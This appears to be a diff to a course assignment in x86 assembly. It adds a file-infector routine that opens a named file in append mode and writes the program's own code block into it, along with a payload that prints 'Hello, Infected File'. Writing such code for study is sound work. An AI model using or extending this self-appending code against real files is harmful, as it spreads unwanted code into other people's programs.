@@ -1,9 +1,13 @@
 section .text
+    msg: db "Hello, Infected File", 10, 0
+
 global _start
 global system_call
 global infection
 global infector
 extern main
+extern strlen
+
 _start:
     pop    dword ecx    ; ecx = argc
     mov    esi,esp      ; esi = argv
@@ -40,8 +44,75 @@ system_call:
     pop     ebp             ; Restore caller state
     ret                     ; Back to caller
 
+code_start:
+
 infection:
+    push    ebp
+    mov     ebp, esp
+    pushad
+
+    push    dword msg    
+    call    strlen
+    add     esp, 4
+
+    mov     edx, eax
+    mov     eax, 4  
+    mov     ebx, 1
+    mov     ecx, msg
+
+    int     0x80
+
+    popad
+    pop     ebp
     ret
 
+
 infector:
+    push    ebp
+    mov     ebp, esp
+    sub     esp, 4      ; fd
+    pushad
+
+    ; print the given filename
+
+    push    dword [ebp + 8]    
+    call    strlen
+    add     esp, 4
+
+    mov     edx, eax
+    mov     eax, 4  
+    mov     ebx, 1
+    mov     ecx, [ebp + 8]  
+    int     0x80
+
+    ; open the file
+
+    mov     eax, 5
+    mov     ebx, [ebp + 8]
+    mov     ecx, 1025       ; write and append
+    mov     edx, 1411       ; all permissions
+    int     0x80
+
+    mov     [ebp - 4], eax
+
+    ; add the code
+
+    mov     eax, 4
+    mov     ebx, [ebp - 4]
+    mov     ecx, code_start
+    mov     edx, code_end
+    sub     edx, code_start
+    int     0x80
+
+    ; close the file
+
+    mov     eax, 6
+    mov     ebx, [ebp - 4]
+    int     0x80
+
+    popad
+    add     esp, 4
+    pop     ebp
     ret
+
+code_end:
